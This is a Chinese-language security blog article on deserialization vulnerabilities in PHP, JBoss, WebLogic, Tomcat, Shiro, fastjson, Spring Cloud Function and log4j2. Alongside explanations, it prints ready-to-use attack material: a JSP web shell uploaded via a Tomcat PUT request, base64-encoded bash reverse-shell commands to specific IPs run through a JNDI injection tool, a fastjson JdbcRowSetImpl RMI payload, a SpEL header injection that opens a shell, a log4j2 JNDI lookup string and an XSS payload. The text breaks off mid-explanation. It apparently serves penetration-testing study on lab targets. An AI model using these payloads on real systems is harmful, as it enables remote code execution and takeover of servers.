{"title":"反序列化漏洞","uid":"9481c28de8022105da3986b737672c94","slug":"反序列化漏洞","date":"2025-07-18T08:00:00.000Z","updated":"2025-09-20T05:40:43.199Z","comments":true,"path":"api/articles/反序列化漏洞.json","keywords":null,"cover":"/images/e.jpg","content":"<h2 id=\"反序列化漏洞\"><a href=\"#反序列化漏洞\" class=\"headerlink\" title=\"反序列化漏洞\"></a>反序列化漏洞</h2><p> <strong>未对反序列化的输入数据做合法性校验，导致攻击者可以控制反序列化的内容。</strong> </p>\n<h4 id=\"lt-一-gt-序列化serialize\"><a href=\"#lt-一-gt-序列化serialize\" class=\"headerlink\" title=\"&lt;一&gt;序列化serialize()\"></a>&lt;一&gt;序列化serialize()</h4><p> <strong>将对象（内存中的数据结构或状态）转换为可存储或传输的格式</strong>（字节流、JSON、XML等）。 </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$test</span>=<span class=\"string\">&quot;pikachu&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$se</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">S</span>(); <span class=\"comment\">//创建一个对象</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$se</span>); <span class=\"comment\">//把这个对象进行序列化</span></span><br><span class=\"line\">序列化后得到的结果是这个样子的:O:<span class=\"number\">1</span>:<span class=\"string\">&quot;S&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;test&quot;</span>;s:<span class=\"number\">7</span>:<span class=\"string\">&quot;pikachu&quot;</span>;&#125;</span><br><span class=\"line\">    O:代表<span class=\"keyword\">object</span></span><br><span class=\"line\">    <span class=\"number\">1</span>:代表对象名字长度为一个字符</span><br><span class=\"line\">    S:对象的名称</span><br><span class=\"line\">    <span class=\"number\">1</span>:代表对象里面有一个变量</span><br><span class=\"line\">    s:数据类型</span><br><span class=\"line\">    <span class=\"number\">4</span>:变量名称的长度</span><br><span class=\"line\">    test:变量名称</span><br><span class=\"line\">    s:数据类型</span><br><span class=\"line\">    <span class=\"number\">7</span>:变量值的长度</span><br><span class=\"line\">    pikachu:变量值</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"lt-二-gt-反序列化unserialize\"><a href=\"#lt-二-gt-反序列化unserialize\" class=\"headerlink\" title=\"&lt;二&gt;反序列化unserialize()\"></a>&lt;二&gt;反序列化unserialize()</h4><p>就是将序列化后的数据还原为原始对象。然后在接下来的代码中继续使用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$u</span>=<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"string\">&quot;O:1:&quot;</span>S<span class=\"string\">&quot;:1:&#123;s:4:&quot;</span>test<span class=\"string\">&quot;;s:7:&quot;</span>pikachu<span class=\"string\">&quot;;&#125;&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$u</span>-&gt;test; <span class=\"comment\">//得到的结果为pikachu</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常见的几个魔法函数:</span><br><span class=\"line\"><span class=\"title function_ invoke__\">__construct</span>()当一个对象创建时被调用</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">__destruct</span>()当一个对象销毁时被调用</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">__sleep</span>() 在对象在被序列化之前运行</span><br><span class=\"line\"></span><br><span class=\"line\">__wakeup将在序列化之后立即被调用</span><br><span class=\"line\"></span><br><span class=\"line\">漏洞举例:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$test</span> = <span class=\"string\">&quot;pikachu&quot;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;test;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$s</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;test&#x27;</span>];</span><br><span class=\"line\">@<span class=\"variable\">$unser</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">payload:O:<span class=\"number\">1</span>:<span class=\"string\">&quot;S&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;test&quot;</span>;s:<span class=\"number\">29</span>:<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"1-thinkphp反序列化\"><a href=\"#1-thinkphp反序列化\" class=\"headerlink\" title=\"1.thinkphp反序列化\"></a>1.thinkphp反序列化</h4><p>用户参数可控，在序列化的时候加入了攻击代码，反序列化的时候没有做安全过滤等机制，导致了参数进入服务器并且魔法函数自动调用导致攻击。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用户参数（实体对象）----序列化（打包）----&gt;序列化字符串------反序列化（拆包）-----&gt;转为实体对象</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"lt-三-gt-php反序列化魔法函数：\"><a href=\"#lt-三-gt-php反序列化魔法函数：\" class=\"headerlink\" title=\"&lt;三&gt;php反序列化魔法函数：\"></a>&lt;三&gt;php反序列化魔法函数：</h4><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>_construct()：创建对象时自动调用</td>\n<td>_destruct()：销毁对象时自动调用</td>\n</tr>\n<tr>\n<td>_get()：读取不可访问属性时，被调用</td>\n<td>_toString()：对象被当作字符串时调用</td>\n</tr>\n<tr>\n<td>_sleep()：对象被序列化前调用</td>\n<td>_wakeup()：对象被序列化后调用</td>\n</tr>\n<tr>\n<td>_call()：调用不可访问方法时，_call()会被调用</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"一、中间件反序列化漏洞\"><a href=\"#一、中间件反序列化漏洞\" class=\"headerlink\" title=\"一、中间件反序列化漏洞\"></a>一、中间件反序列化漏洞</h3><h4 id=\"1-jboss反序列化\"><a href=\"#1-jboss反序列化\" class=\"headerlink\" title=\"1.jboss反序列化\"></a>1.jboss反序列化</h4><p>JBoss 5.x&#x2F;6.x 反序列化漏洞  </p>\n<p>该漏洞利用了 Jboss 的 HttpInvoker 组件中的 <strong>ReadOnlyAccessFilter 过滤器</strong>。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化 。</p>\n<p><strong>HttpInvoker</strong> 是 JBoss（WildFly）提供的一个远程调用（RPC）框架，允许客户端通过 <strong>HTTP 协议</strong> 调用服务器端的 Java 方法（类似 Java RMI，但基于 HTTP）。其核心特点包括：</p>\n<ul>\n<li><strong>基于序列化</strong>：通过 Java 对象序列化传输数据</li>\n</ul>\n<p><strong><code>ReadOnlyAccessFilter</code></strong>  是 JBoss HttpInvoker 的一个<strong>安全过滤器</strong>，主要用于：</p>\n<ul>\n<li><strong>限制远程调用的权限</strong>：确保只有 <strong>只读操作</strong>（如查询）能被执行，阻止 <strong>写操作</strong>（如修改配置、执行命令）。</li>\n<li><strong>防御恶意调用</strong>：防止攻击者通过 HttpInvoker 接口执行危险操作（如反序列化攻击、未授权访问）。</li>\n</ul>\n<h4 id=\"2-WebLogic反序列化\"><a href=\"#2-WebLogic反序列化\" class=\"headerlink\" title=\"2.WebLogic反序列化\"></a>2.WebLogic反序列化</h4><p><strong>WebLogic 服务在反序列化数据时未进行安全校验</strong>，攻击者可构造恶意序列化数据，WebLogic 自动反序列化数据，执行恶意脚本或命令</p>\n<p>Weblogic <strong>常见漏洞</strong>有那些：</p>\n<ul>\n<li>弱口令</li>\n<li>反序列化漏洞（CVE-2019-2725 ）</li>\n<li>任意文件上传漏洞操作（CVE-2018-2894）</li>\n<li>SSRF 漏洞（需要安装Weblogic时选择UDDI组件）</li>\n</ul>\n<h4 id=\"3-tomcat反序列化\"><a href=\"#3-tomcat反序列化\" class=\"headerlink\" title=\"3.tomcat反序列化\"></a>3.tomcat反序列化</h4><p>CVE-2017-12615是Apache Tomcat中的一个高危漏洞  </p>\n<p>Tomcat运行在Windows操作系统上，并启用了**<code>HTTP PUT</code><strong>请求方法时，攻击者可以通过构造PUT请求，在服务器上任意写入文件。这种漏洞允许攻击者上传</strong>JSP文件**到服务器，再使用木马连接工具操控对方服务器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT /xx.jsp/ HTTP/1.1</span><br><span class=\"line\">HOST: *****</span><br><span class=\"line\">User-Agent: ******</span><br><span class=\"line\">........</span><br><span class=\"line\">--------------------------------请求体xx.jsp木马内容，密码passwd-----------------------------</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    class U extends ClassLoader &#123;</span><br><span class=\"line\">        U(ClassLoader c) &#123;</span><br><span class=\"line\">            super(c);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public Class g(byte[] b) &#123;</span><br><span class=\"line\">            return super.defineClass(b, 0, b.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class=\"line\">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class=\"line\">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class=\"line\">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class=\"line\">    if (cls != null) &#123;</span><br><span class=\"line\">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"二、框架漏洞反序列化\"><a href=\"#二、框架漏洞反序列化\" class=\"headerlink\" title=\"二、框架漏洞反序列化\"></a>二、框架漏洞反序列化</h3><h4 id=\"lt-一-gt-JNDI\"><a href=\"#lt-一-gt-JNDI\" class=\"headerlink\" title=\"&lt;一&gt;  JNDI\"></a>&lt;一&gt;  JNDI</h4><p>JNDI全称为<strong>Java命名和目录接口</strong>。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。  </p>\n<h4 id=\"lt-二-gt-RMI\"><a href=\"#lt-二-gt-RMI\" class=\"headerlink\" title=\"&lt;二&gt;  RMI\"></a>&lt;二&gt;  RMI</h4><p><strong>RMI</strong>（Remote Method Invocation）<strong>远程方法调用</strong>，是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。</p>\n<h4 id=\"lt-三-gt-lookup函数\"><a href=\"#lt-三-gt-lookup函数\" class=\"headerlink\" title=\"&lt;三&gt; lookup函数\"></a>&lt;三&gt; lookup函数</h4><p>如果lookup参数可控的话，那么我们就可以传入恶意的url地址来控制受害者加载攻击者指定的恶意类。当我们指定一个恶意的URL地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在RMI中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个class文件，当然也就不能成功获取到这个对象。</p>\n<h4 id=\"lt-四-gt-LADP\"><a href=\"#lt-四-gt-LADP\" class=\"headerlink\" title=\"&lt;四&gt;  LADP\"></a>&lt;四&gt;  LADP</h4><p>LDAP是<strong>轻型目录访问协议</strong>的缩写，是一种用于访问和维护分层目录信息的协议。</p>\n<h4 id=\"1-shiro550反序列化\"><a href=\"#1-shiro550反序列化\" class=\"headerlink\" title=\"1.shiro550反序列化\"></a>1.shiro550反序列化</h4><p>Apache Shiro 1.4.2之前版本中存在安全漏洞。当Apache Shiro使用了默认的‘记住我’配置时，攻击者可利用该漏洞对cookies实施填充攻击。 </p>\n<h5 id=\"1-原理：\"><a href=\"#1-原理：\" class=\"headerlink\" title=\"1.原理：\"></a>1.原理：</h5><p>shiro默认使用了<strong>Cookie RememberMe Manager</strong>，其处理cookie（值）的流程（反序列化过程）是：</p>\n<p><code>得到rememberMe（参数）的cookie值 –-&gt; Base64解码 –-&gt; AES解密 –-&gt;反序列化</code> </p>\n<p>然而AES的密钥是<strong>硬编码</strong>的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。，最终实现远程代码执行（RCE） </p>\n<h5 id=\"2-相关知识\"><a href=\"#2-相关知识\" class=\"headerlink\" title=\"2.相关知识\"></a>2.相关知识</h5><ul>\n<li><strong>Cookie 值本身是加密后的数据</strong> </li>\n<li><strong>AES硬编码</strong> 指在代码或配置中直接明文写入 <strong>AES加密算法的密钥（Key）或初始化向量（IV）</strong>，例如：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 硬编码示例（不安全！）</span></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;0123456789ABCDEF0123456789ABCDEF&quot;</span>; <span class=\"comment\">// 32字节密钥（AES-256）</span></span><br><span class=\"line\"><span class=\"type\">byte</span>[] iv = <span class=\"string\">&quot;1234567890ABCDEF&quot;</span>.getBytes();       <span class=\"comment\">// 16字节IV</span></span><br></pre></td></tr></table></figure>\n\n<p> 这种方式将敏感信息（密钥）直接暴露在源码中，而非通过安全方式（如密钥管理系统、环境变量）动态获取。</p>\n<h5 id=\"3-判断：\"><a href=\"#3-判断：\" class=\"headerlink\" title=\"3.判断：\"></a>3.判断：</h5><p>1.数据返回包中包含 <strong>rememberMe&#x3D;deleteMe</strong> 字段。 </p>\n<p>2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的 cookie 中增加字段：**rememberMe&#x3D;**然后查看返回数据包中是否存在关键字。   </p>\n<h4 id=\"2-fastjson反序列化\"><a href=\"#2-fastjson反序列化\" class=\"headerlink\" title=\"2.fastjson反序列化\"></a>2.fastjson反序列化</h4><p>fastjson是阿里巴巴的开源JSON解析库，fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。  </p>\n<p>JSON字符串中多出了一个<a href=\"https://github.com/type\">@type</a>字段，使用SerializerFeature.WriteClassName  标注了类对应的原始类型，方便在反序列化的时候定位到具体类型，这个就是AutoType，和引入AutoType的原因。  </p>\n<h5 id=\"1-1-原理：\"><a href=\"#1-1-原理：\" class=\"headerlink\" title=\"1.1 原理：\"></a>1.1 原理：</h5><p>fastjson在解析json的过程中,支持使用**@type字段<strong>来指定反序列化的类型,并调用该类的</strong>set&#x2F;get方法<strong>来访问属性,当组件</strong>开启了autotype功能**并且反序列化不可信数据时,攻击者可以构造数据,</p>\n<p>使目标应用的代码执行流程进入特定类的特定<strong>setter或者getter</strong>方法中,即可构造出一些恶意利用链。</p>\n<h5 id=\"1-2-指纹特征：\"><a href=\"#1-2-指纹特征：\" class=\"headerlink\" title=\"1.2 指纹特征：\"></a>1.2 指纹特征：</h5><p>(1) 根据返回包判断<br> 任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样。当然这个可以屏蔽！</p>\n<p>(2)利用DNSlog盲打<br> 构造以下<strong>payload</strong>，利用dnslog平台接收</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>(3) Java站并且传的数据是JSON格式的都可以尝试</p>\n<p>(4) 指纹扫描检测</p>\n<h5 id=\"1-3-漏洞利用\"><a href=\"#1-3-漏洞利用\" class=\"headerlink\" title=\"1.3 漏洞利用\"></a>1.3 漏洞利用</h5><p>Fastjson 漏洞依赖特定类的属性和方法，经典利用链包括：</p>\n<ul>\n<li><strong>JdbcRowSetImpl + JNDI 注入</strong>（CVE-2017-18349、cnvd_2019_22238  ）：<ul>\n<li><code>JdbcRowSetImpl</code> 的 <code>setDataSourceName()</code> 方法触发 JNDI 查询。</li>\n<li>结合远程恶意类加载（如 <code>Exploit.class</code> 中定义静态代码块执行命令）。</li>\n</ul>\n</li>\n</ul>\n<p>示例：</p>\n<p>在公网服务器上JNDI注入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class=\"string\">&quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class=\"string\">&quot;121.40.162.39&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#相关说明：</span></span><br><span class=\"line\">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==    --<span class=\"built_in\">base64</span>解码--&gt;</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/121.40.162.39/7777 0&gt;&amp;1  <span class=\"comment\">#攻击者IP和监听端口，前后一致</span></span><br></pre></td></tr></table></figure>\n\n<p>将会生成rmi：</p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/JNDI.png\"></p>\n<p>刷新页面抓包，修改请求方式为POST，设置fastjson payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">    &quot;dataSourceName&quot;:&quot;rmi://8.220.194.45:1099/7b2rz4&quot;,</span><br><span class=\"line\">    &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>再开一个终端，执行监听<code>nc -nvlp 7777</code>；并将修改之后的bp包发送，成功将触发shell反弹：</p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/fastjson_payload.png\"></p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/fastjson_shell%E5%8F%8D%E5%BC%B9.png\"></p>\n<h4 id=\"3-springboot反序列化（绿叶）\"><a href=\"#3-springboot反序列化（绿叶）\" class=\"headerlink\" title=\"3.springboot反序列化（绿叶）\"></a>3.springboot反序列化（绿叶）</h4><h5 id=\"1-原理：-1\"><a href=\"#1-原理：-1\" class=\"headerlink\" title=\"1.原理：\"></a>1.原理：</h5><p><strong>当Spring Cloud Function 使用functionRouter路径时</strong>，HTTP请求头参数存在 <strong>SPEL表达式注入</strong>漏洞，攻击者可通过该漏洞进行远程命令执行。</p>\n<p>请求头修改、增加内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /functionRouter HTTP/1.1 #修改内容</span><br><span class=\"line\">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS8yMjIyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)  #需要添加的内容</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-漏洞利用\"><a href=\"#2-漏洞利用\" class=\"headerlink\" title=\"2.漏洞利用\"></a>2.漏洞利用</h5><p>靶场：春秋云镜 CVE-2022-22963</p>\n<p>在kali里用sbscan扫描,发现springboot漏洞：</p>\n<p><code># python.exe sbscan.py -u  [ip]</code></p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/springboot_sbscan.png\"></p>\n<p>抓包修改：</p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/springboot_bp.png\"></p>\n<p>开启监听，然后发送请求，收到shell反弹：</p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/springboot_shell%E5%8F%8D%E5%BC%B9.png\"></p>\n<h4 id=\"4-log4j与log4j2的关系\"><a href=\"#4-log4j与log4j2的关系\" class=\"headerlink\" title=\"4.log4j与log4j2的关系\"></a>4.log4j与log4j2的关系</h4><p>log4j 是 Apache 的一个开源日志库，是一个<strong>基于 Java 的日志记录框架</strong>  </p>\n<p>Log4j2 是 log4j 的后继者，其中引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，被应用于业务系统开发，用于记录程序输入输出日志信息  </p>\n<h4 id=\"5-log4j2反序列化\"><a href=\"#5-log4j2反序列化\" class=\"headerlink\" title=\"5.log4j2反序列化\"></a>5.log4j2反序列化</h4><h5 id=\"1-原理：-2\"><a href=\"#1-原理：-2\" class=\"headerlink\" title=\"1.原理：\"></a>1.原理：</h5><p>log4j2 在日志输出中，<strong>未对字符合法性进行严格的限制</strong>，攻击者通过构造**<code>$&#123;jndi:ldap:恶意url/poc&#125;</code><strong>恶意日志，在log4j2通过 JNDI 的</strong>lookup()**函数解析日志时，就会执行poc.class文件里的代码，实现 JNDI注入，从而造成RCE。</p>\n<p><img src=\"/.%E8%BF%9B%E9%98%B6_picture/log4j2%E5%8E%9F%E7%90%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png\"></p>\n<h5 id=\"2-漏洞利用-1\"><a href=\"#2-漏洞利用-1\" class=\"headerlink\" title=\"2.漏洞利用\"></a>2.漏洞利用</h5><p> Log4j2 默认支持 <strong><code>$&#123;jndi:ldap://attacker.com/exp&#125;</code></strong> 这种语法，攻击者可以通过恶意日志消息触发 <strong>远程代码执行（RCE）</strong> </p>\n<p>使用jndi利用工具执行反弹shell (经过base64) 必须是公网的服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;1</span><br><span class=\"line\">8.220.194.45 → 攻击者ip</span><br><span class=\"line\">7777 任意端口（后续要监听）</span><br><span class=\"line\"></span><br><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class=\"string\">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class=\"string\">&quot;8.134.69.71&quot;</span>  </span><br></pre></td></tr></table></figure>\n\n<p>说明：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">命令解析：bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">该命令用于创建一个反向Shell连接，将本地Shell会话重定向到远程主机的指定端口。以下是每个字段的详细解释：</span><br><span class=\"line\">1. bash -i</span><br><span class=\"line\"></span><br><span class=\"line\">    bash：调用Bash Shell。</span><br><span class=\"line\">    -i：以交互模式（Interactive Mode）启动Shell，允许用户输入命令并接收输出。</span><br><span class=\"line\"></span><br><span class=\"line\">2. &gt;&amp; /dev/tcp/8.220.194.45/7777</span><br><span class=\"line\"></span><br><span class=\"line\">    &gt;&amp;：将标准输出（stdout）和标准错误（stderr）重定向到指定目标。</span><br><span class=\"line\">    /dev/tcp/8.220.194.45/7777：</span><br><span class=\"line\">        /dev/tcp：Bash内置的虚拟设备，支持通过TCP协议进行网络通信。</span><br><span class=\"line\">        8.220.194.45：远程主机的IP地址。</span><br><span class=\"line\">        7777：远程主机监听的端口号。</span><br><span class=\"line\">        作用：将Shell的输出和错误信息发送到远程主机的7777端口。</span><br><span class=\"line\"></span><br><span class=\"line\">3. 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">    0：标准输入（stdin）的文件描述符。</span><br><span class=\"line\">    &gt;&amp;1：将标准输入重定向到标准输出（即远程连接）。</span><br><span class=\"line\">    